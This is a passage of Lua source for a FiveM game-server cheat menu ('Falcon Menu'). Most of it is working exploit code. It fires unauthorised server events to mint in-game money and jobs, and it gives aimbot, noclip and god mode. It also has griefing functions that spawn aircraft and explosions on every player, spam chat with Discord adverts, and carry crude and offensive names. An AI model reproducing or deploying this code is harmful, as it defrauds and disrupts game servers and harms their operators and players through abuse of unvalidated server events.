				TriggerServerEvent('esx_vehicletrunk:giveDirty', 70000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 70000)
				TriggerServerEvent('gambling:spend', 70000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 70000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 70000)
				TriggerServerEvent('AdminMenu:giveBank', 70000)
				TriggerServerEvent('AdminMenu:giveCash', 70000)
				TriggerServerEvent('esx_slotmachine:sv:2', 70000)
				TriggerServerEvent('esx_truckerjob:pay', 70000)
				TriggerServerEvent('esx_moneywash:deposit', 70000)
				TriggerServerEvent('esx_moneywash:withdraw', 70000)
				TriggerServerEvent('esx_moneywash:deposit', 70000)
				TriggerServerEvent('mission:completed', 70000)
				TriggerServerEvent('truckerJob:success',70000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 70000)
				TriggerServerEvent("dropOff", 70000)
				TriggerServerEvent('truckerfuel:success',70000)
				TriggerServerEvent('delivery:success',70000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -70000})
				TriggerServerEvent("esx_brinksjob:pay", 70000)
				TriggerServerEvent("esx_garbagejob:pay", 70000)
				TriggerServerEvent("esx_postejob:pay", 70000)
				TriggerServerEvent('esx_garbage:pay', 70000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~80k+") then
				TriggerServerEvent('esx_truckerjob:pay', 80000)
				TriggerServerEvent('vrp_slotmachine:server:2', 80000)
				TriggerServerEvent("esx_pizza:pay", 80000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 80000)
				TriggerServerEvent('lscustoms:payGarage', 80000)
				TriggerServerEvent('esx_tankerjob:pay', 80000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 80000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 80000)
				TriggerServerEvent('gambling:spend', 80000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 80000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 80000)
				TriggerServerEvent('AdminMenu:giveBank', 80000)
				TriggerServerEvent('AdminMenu:giveCash', 80000)
				TriggerServerEvent('esx_slotmachine:sv:2', 80000)
				TriggerServerEvent('esx_truckerjob:pay', 80000)
				TriggerServerEvent('esx_moneywash:deposit', 80000)
				TriggerServerEvent('esx_moneywash:withdraw', 80000)
				TriggerServerEvent('esx_moneywash:deposit', 80000)
				TriggerServerEvent('mission:completed', 80000)
				TriggerServerEvent('truckerJob:success',80000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 80000)
				TriggerServerEvent("dropOff", 80000)
				TriggerServerEvent('truckerfuel:success',80000)
				TriggerServerEvent('delivery:success',80000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -80000})
				TriggerServerEvent("esx_brinksjob:pay", 80000)
				TriggerServerEvent("esx_garbagejob:pay", 80000)
				TriggerServerEvent("esx_postejob:pay", 80000)
				TriggerServerEvent('esx_garbage:pay', 80000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~90k+") then
				TriggerServerEvent('esx_truckerjob:pay', 90000)
				TriggerServerEvent('vrp_slotmachine:server:2', 90000)
				TriggerServerEvent("esx_pizza:pay", 90000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 90000)
				TriggerServerEvent('lscustoms:payGarage', 90000)
				TriggerServerEvent('esx_tankerjob:pay', 90000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 90000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 90000)
				TriggerServerEvent('gambling:spend', 90000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 90000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 90000)
				TriggerServerEvent('AdminMenu:giveBank', 90000)
				TriggerServerEvent('AdminMenu:giveCash', 90000)
				TriggerServerEvent('esx_slotmachine:sv:2', 90000)
				TriggerServerEvent('esx_truckerjob:pay', 90000)
				TriggerServerEvent('esx_moneywash:deposit', 90000)
				TriggerServerEvent('esx_moneywash:withdraw', 90000)
				TriggerServerEvent('esx_moneywash:deposit', 90000)
				TriggerServerEvent('mission:completed', 90000)
				TriggerServerEvent('truckerJob:success',90000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 90000)
				TriggerServerEvent("dropOff", 90000)
				TriggerServerEvent('truckerfuel:success',90000)
				TriggerServerEvent('delivery:success',90000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -90000})
				TriggerServerEvent("esx_brinksjob:pay", 90000)
				TriggerServerEvent("esx_garbagejob:pay", 90000)
				TriggerServerEvent("esx_postejob:pay", 90000)
				TriggerServerEvent('esx_garbage:pay', 90000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~100k+") then
				TriggerServerEvent('esx_truckerjob:pay', 100000)
				TriggerServerEvent('vrp_slotmachine:server:2', 100000)
				TriggerServerEvent("esx_pizza:pay", 1000000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 100000)
				TriggerServerEvent('lscustoms:payGarage', 100000)
				TriggerServerEvent('esx_tankerjob:pay', 100000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 100000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 100000)
				TriggerServerEvent('gambling:spend', 100000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 100000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 100000)
				TriggerServerEvent('AdminMenu:giveBank', 100000)
				TriggerServerEvent('AdminMenu:giveCash', 100000)
				TriggerServerEvent('esx_slotmachine:sv:2', 100000)
				TriggerServerEvent('esx_truckerjob:pay', 100000)
				TriggerServerEvent('esx_moneywash:deposit', 100000)
				TriggerServerEvent('esx_moneywash:withdraw', 100000)
				TriggerServerEvent('esx_moneywash:deposit', 100000)
				TriggerServerEvent('mission:completed', 100000)
				TriggerServerEvent('truckerJob:success',100000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 100000)
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('truckerfuel:success',100000)
				TriggerServerEvent('delivery:success',100000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
				TriggerServerEvent("esx_brinksjob:pay", 100000)
				TriggerServerEvent("esx_garbagejob:pay", 100000)
				TriggerServerEvent("esx_postejob:pay", 100000)
				TriggerServerEvent('esx_garbage:pay', 100000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~200k+") then
				TriggerServerEvent('esx_truckerjob:pay', 200000)
				TriggerServerEvent('vrp_slotmachine:server:2', 200000)
				TriggerServerEvent("esx_pizza:pay", 2000000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 200000)
				TriggerServerEvent('lscustoms:payGarage', 200000)
				TriggerServerEvent('esx_tankerjob:pay', 200000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 200000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 200000)
				TriggerServerEvent('gambling:spend', 200000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 200000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 200000)
				TriggerServerEvent('AdminMenu:giveBank', 200000)
				TriggerServerEvent('AdminMenu:giveCash', 200000)
				TriggerServerEvent('esx_slotmachine:sv:2', 200000)
				TriggerServerEvent('esx_truckerjob:pay', 200000)
				TriggerServerEvent('esx_moneywash:deposit', 200000)
				TriggerServerEvent('esx_moneywash:withdraw', 200000)
				TriggerServerEvent('esx_moneywash:deposit', 200000)
				TriggerServerEvent('mission:completed', 200000)
				TriggerServerEvent('truckerJob:success',200000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 200000)
				TriggerServerEvent("dropOff", 200000)
				TriggerServerEvent('truckerfuel:success',200000)
				TriggerServerEvent('delivery:success',200000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -200000})
				TriggerServerEvent("esx_brinksjob:pay", 200000)
				TriggerServerEvent("esx_garbagejob:pay", 200000)
				TriggerServerEvent("esx_postejob:pay", 200000)
				TriggerServerEvent('esx_garbage:pay', 200000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~300k+") then
				TriggerServerEvent('esx_truckerjob:pay', 300000)
				TriggerServerEvent('vrp_slotmachine:server:2', 300000)
				TriggerServerEvent("esx_pizza:pay", 3000000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 300000)
				TriggerServerEvent('lscustoms:payGarage', 300000)
				TriggerServerEvent('esx_tankerjob:pay', 300000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 300000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 300000)
				TriggerServerEvent('gambling:spend', 300000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 300000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 300000)
				TriggerServerEvent('AdminMenu:giveBank', 300000)
				TriggerServerEvent('AdminMenu:giveCash', 300000)
				TriggerServerEvent('esx_slotmachine:sv:2', 300000)
				TriggerServerEvent('esx_truckerjob:pay', 300000)
				TriggerServerEvent('esx_moneywash:deposit', 300000)
				TriggerServerEvent('esx_moneywash:withdraw', 300000)
				TriggerServerEvent('esx_moneywash:deposit', 300000)
				TriggerServerEvent('mission:completed', 300000)
				TriggerServerEvent('truckerJob:success',300000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 300000)
				TriggerServerEvent("dropOff", 300000)
				TriggerServerEvent('truckerfuel:success',300000)
				TriggerServerEvent('delivery:success',300000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -300000})
				TriggerServerEvent("esx_brinksjob:pay", 300000)
				TriggerServerEvent("esx_garbagejob:pay", 300000)
				TriggerServerEvent("esx_postejob:pay", 300000)
				TriggerServerEvent('esx_garbage:pay', 300000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~400k+") then
				TriggerServerEvent('esx_truckerjob:pay', 400000)
				TriggerServerEvent('vrp_slotmachine:server:2', 400000)
				TriggerServerEvent("esx_pizza:pay", 4000000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 400000)
				TriggerServerEvent('lscustoms:payGarage', 400000)
				TriggerServerEvent('esx_tankerjob:pay', 400000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 400000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 400000)
				TriggerServerEvent('gambling:spend', 400000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 400000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 400000)
				TriggerServerEvent('AdminMenu:giveBank', 400000)
				TriggerServerEvent('AdminMenu:giveCash', 400000)
				TriggerServerEvent('esx_slotmachine:sv:2', 400000)
				TriggerServerEvent('esx_truckerjob:pay', 400000)
				TriggerServerEvent('esx_moneywash:deposit', 400000)
				TriggerServerEvent('esx_moneywash:withdraw', 400000)
				TriggerServerEvent('esx_moneywash:deposit', 400000)
				TriggerServerEvent('mission:completed', 400000)
				TriggerServerEvent('truckerJob:success',400000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 400000)
				TriggerServerEvent("dropOff", 400000)
				TriggerServerEvent('truckerfuel:success',400000)
				TriggerServerEvent('delivery:success',400000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -400000})
				TriggerServerEvent("esx_brinksjob:pay", 400000)
				TriggerServerEvent("esx_garbagejob:pay", 400000)
				TriggerServerEvent("esx_postejob:pay", 400000)
				TriggerServerEvent('esx_garbage:pay', 400000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~500k+") then
				TriggerServerEvent('esx_truckerjob:pay', 500000)
				TriggerServerEvent('vrp_slotmachine:server:2', 500000)
				TriggerServerEvent("esx_pizza:pay", 5000000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 500000)
				TriggerServerEvent('lscustoms:payGarage', 500000)
				TriggerServerEvent('esx_tankerjob:pay', 500000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 500000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 500000)
				TriggerServerEvent('gambling:spend', 500000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 500000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
				TriggerServerEvent('AdminMenu:giveBank', 500000)
				TriggerServerEvent('AdminMenu:giveCash', 500000)
				TriggerServerEvent('esx_slotmachine:sv:2', 500000)
				TriggerServerEvent('esx_truckerjob:pay', 500000)
				TriggerServerEvent('esx_moneywash:deposit', 500000)
				TriggerServerEvent('esx_moneywash:withdraw', 500000)
				TriggerServerEvent('esx_moneywash:deposit', 500000)
				TriggerServerEvent('mission:completed', 500000)
				TriggerServerEvent('truckerJob:success',500000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 500000)
				TriggerServerEvent("dropOff", 500000)
				TriggerServerEvent('truckerfuel:success',500000)
				TriggerServerEvent('delivery:success',500000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -500000})
				TriggerServerEvent("esx_brinksjob:pay", 500000)
				TriggerServerEvent("esx_garbagejob:pay", 500000)
				TriggerServerEvent("esx_postejob:pay", 500000)
				TriggerServerEvent('esx_garbage:pay', 500000)
			end


				elseif Falcon.IsMenuOpened('other') then
				if Falcon.Button("~r~Remove Job") then
					TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
				elseif Falcon.Button("~s~Recruit~c~ Mechanic") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(-1), "mecano", result)
				elseif Falcon.Button("~s~Recruit~b~ Police") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(-1), "police", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(-1), "police", result)
				elseif Falcon.Button("~s~Recruit~c~ Mafia") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(-1), "mafia", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(-1), "mafia", result)
				elseif Falcon.Button("~s~Recruit~p~ Gang") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(-1), "gang", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(-1), "gang", result)
				elseif Falcon.Button("~s~Recruit~y~ Taxi") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(-1), "taxi", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(-1), "taxi", result)
				elseif Falcon.Button("~s~Recruit~r~ Inem") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(-1), "ambulance", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(-1), "ambulance", result)
				 end



			elseif Falcon.IsMenuOpened('esx') then
				if Falcon.Button("~g~ESX ~w~Restore Hunger") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif Falcon.Button("~g~ESX ~w~Restore Thirst") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif Falcon.Button("~g~ESX ~w~Revive Self") then
					TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
				elseif Falcon.Button("~g~ESX ~w~Revive By ID") then
					local serverID = GetKeyboardInput("Enter Player Server ID:")
					TriggerServerEvent('esx_ambulancejob:revive', serverID)
				end



			elseif Falcon.IsMenuOpened('vrp') then
				if Falcon.MenuButton("~h~~y~»~r~ Spawn ~b~Money ~r~NEW", 'money') then
				elseif Falcon.Button("~r~~h~VRP ~s~~b~Toggle Handcuffs") then
					vRP.toggleHandcuff()
				elseif Falcon.Button("~r~~h~VRP ~s~~b~Clear Wanted Level") then
					vRP.applyWantedLevel(0)
				elseif Falcon.Button("~r~~h~VRP ~s~~b~Give Money (vrp_trucker)") then
					local money = GetKeyboardInput("Enter $ Amount:")
					local distance = money / 3.80 -- money is distance*3.80
					vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
					vRPtruckS.finishTruckingDelivery({distance})
				elseif Falcon.Button("~r~~h~VRP ~s~~b~Give Casino Chips (vrp_casino)") then
					local amount = GetKeyboardInput("Enter Chips Amount:")
					vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
					vRPcasinoS.payRouletteWinnings({amount, 2})
				elseif Falcon.Button("~r~~h~VRP ~s~~b~Bank Deposit ~r~NEW") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif Falcon.Button("~r~~h~VRP ~s~~b~Bank Withdraw ~r~NEW") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
				elseif Falcon.Button("~r~~h~VRP ~s~~b~Get driving license ~r~NEW") then
					TriggerServerEvent("dmv:success")
				end


			elseif Falcon.IsMenuOpened('credits') then
				for i = 1, #developers do if Falcon.Button(developers[i]) then end end

			elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then Falcon.OpenMenu('Falcon')


			elseif IsDisabledControlPressed(0, Keys[menuKeybind2]) then Falcon.OpenMenu('Falcon')

			elseif IsControlJustReleased(0, Keys[noclipKeybind]) then ToggleNoclip()

			elseif IsControlJustReleased(0, Keys[teleportKeyblind]) then TeleportToWaypoint()

			elseif IsControlJustReleased(0, Keys[fixvaiculoKeyblind]) then fixcar() end

			Falcon.Display()

			if Demigod then
				if GetEntityHealth(PlayerPedId()) < 200 then
					SetEntityHealth(PlayerPedId(), 200)
				end
			end

			if ADemigod then
				SetEntityHealth(PlayerPedId(), 189.9)
			end

			if Noclipping then
				local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
				local k = nil
				local x, y, z = nil

				if not isInVehicle then
					k = PlayerPedId()
					x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
				else
					k = GetVehiclePedIsIn(PlayerPedId(), 0)
					x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
				end

				if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end

				local dx, dy, dz = GetCamDirection()
				SetEntityVisible(PlayerPedId(), 0, 0)
				SetEntityVisible(k, 0, 0)

				SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)

				if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then -- Change speed
					oldSpeed = NoclipSpeed
					NoclipSpeed = NoclipSpeed * 2
				end
				if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then -- Restore speed
					NoclipSpeed = oldSpeed
				end

				if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
					x = x + NoclipSpeed * dx
					y = y + NoclipSpeed * dy
					z = z + NoclipSpeed * dz
				end

				if IsDisabledControlPressed(0, 269) then -- MOVE BACK
					x = x - NoclipSpeed * dx
					y = y - NoclipSpeed * dy
					z = z - NoclipSpeed * dz
				end

				if IsDisabledControlPressed(0, Keys["SPACE"]) then -- MOVE UP
					z = z + NoclipSpeed
				end

				if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then -- MOVE DOWN
					z = z - NoclipSpeed
				end


				SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
			end

			if ExplodingAll then
				ExplodeAll(includeself)
			end

			if Tracking then
				local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
				SetNewWaypoint(coords.x, coords.y)
			end

			if FlingingPlayer then
				local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
				Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
			end

			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end

			if Invisibility then
				SetEntityVisible(PlayerPedId(), 0, 0)
			end

			if Forcefield then
				DoForceFieldTick(ForcefieldRadius)
			end

			if CarsDisabled then
				local plist = GetActivePlayers()
				for i = 1, #plist do
					if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
						ClearPedTasksImmediately(GetPlayerPed(plist[i]))
					end
				end
			end

			if GunsDisabled then
				local plist = GetActivePlayers()
				for i = 1, #plist do
					if IsPedShooting(GetPlayerPed(plist[i])) then
						ClearPedTasksImmediately(GetPlayerPed(plist[i]))
					end
				end
			end

			if NoisyCars then
				for k in EnumerateVehicles() do
					SetVehicleAlarmTimeLeft(k, 500)
				end
			end

			if FlyingCars then
				for k in EnumerateVehicles() do
					RequestControlOnce(k)
					ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end
			end

			if SuperGravity then
				for k in EnumerateVehicles() do
					RequestControlOnce(k)
					SetVehicleGravityAmount(k, GravAmount)
				end
			end

			function nukeserver()
		Citizen.CreateThread(function()
			local dg="Avenger"
			local dh="CARGOPLANE"
			local di="luxor"
			local dj="maverick"
			local dk="blimp2"

			while not HasModelLoaded(GetHashKey(dh))do
				Citizen.Wait(0)
				RequestModel(GetHashKey(dh))
			end

			while not HasModelLoaded(GetHashKey(di))do
				Citizen.Wait(0)RequestModel(GetHashKey(di))
			end

			while not HasModelLoaded(GetHashKey(dg))do
				Citizen.Wait(0)RequestModel(GetHashKey(dg))
			end

			while not HasModelLoaded(GetHashKey(dj))do
				Citizen.Wait(0)RequestModel(GetHashKey(dj))
			end

			while not HasModelLoaded(GetHashKey(dk))do
				Citizen.Wait(0)RequestModel(GetHashKey(dk))
			end

			for bs=0,9 do
				TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"^1F^2a^3l^4c^5o^6n ^1M^2e^3n^4u ^4best hack on the market right now! https://discord.gg/eb8sget")
			end

			for i=0,128 do
				local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
			end
			ShowInfo("~g~Fucked :(")
		 end)
		end

		function RapeAllFunc()
			for i = 0, 128 do
				TriggerServerEvent(
			'_chat:messageEntered',
			'Falcon',
			{0, 0x99, 255},
			'^^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV'
		)
			TriggerServerEvent('_chat:messageEntered', '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV', {0, 0x99, 255}, '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV')
			end
		end
		

			if WorldOnFire then
				local pos = GetEntityCoords(PlayerPedId())
				local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
				if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
					local targetpos = GetEntityCoords(k)
					local x, y, z = table.unpack(targetpos)
					local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
					local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
					local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
					AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
					AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
				end

				for v in EnumeratePeds() do
					if v ~= PlayerPedId() then
						local targetpos = GetEntityCoords(v)
						local x, y, z = table.unpack(targetpos)
						local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
						local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
						local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
						AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
						AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
					end
				end
			end

			if FuckMap then
				for i = -4000.0, 8000.0, 3.14159 do
					local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
					local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
					local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)

					CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
					CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
					CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
				end
			end

			function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
				AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
				DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
				blockinput = true
			
				while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
					Citizen.Wait(0)
				end
			
				if UpdateOnscreenKeyboard() ~= 2 then
					local result = GetOnscreenKeyboardResult()
					Citizen.Wait(500)
					blockinput = false
					return result
				else
					Citizen.Wait(500)
					blockinput = false
					return nil
				end
			end

			if ClearStreets then
				SetVehicleDensityMultiplierThisFrame(0.0)
				SetRandomVehicleDensityMultiplierThisFrame(0.0)
				SetParkedVehicleDensityMultiplierThisFrame(0.0)
				SetAmbientVehicleRangeMultiplierThisFrame(0.0)
				SetPedDensityMultiplierThisFrame(0.0)
			end

			if RapidFire then
				DoRapidFireTick()
			end

			if Aimbot then

				-- Draw FOV
				if DrawFov then
					DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
					DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
					DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
					DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
				end

				local plist = GetActivePlayers()
				for i = 1, #plist do
					ShootAimbot(GetPlayerPed(plist[i]))
				end

			end

			if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
				for k in EnumeratePeds() do
					if k ~= PlayerPedId() then RageShoot(k) end
				end
			end

			if Crosshair then
				ShowHudComponentThisFrame(14)
			end

			if ShowCoords then
				local pos = GetEntityCoords(PlayerPedId())
				DrawTxt("~b~X: ~w~" .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
				DrawTxt("~b~Y: ~w~" .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
				DrawTxt("~b~Z: ~w~" .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
			end

			if ExplosiveAmmo then
				local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
				if ret then
					AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
				end
			end
			
			if ForceGun then
				local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
				if ret then
					for k in EnumeratePeds() do
						local coords = GetEntityCoords(k)
						if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
							local forward = GetEntityForwardVector(PlayerPedId())
							RequestControlOnce(k)
							ApplyForce(k, forward * 500)
						end
					end

					for k in EnumerateVehicles() do
						local coords = GetEntityCoords(k)
						if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
							local forward = GetEntityForwardVector(PlayerPedId())
							RequestControlOnce(k)
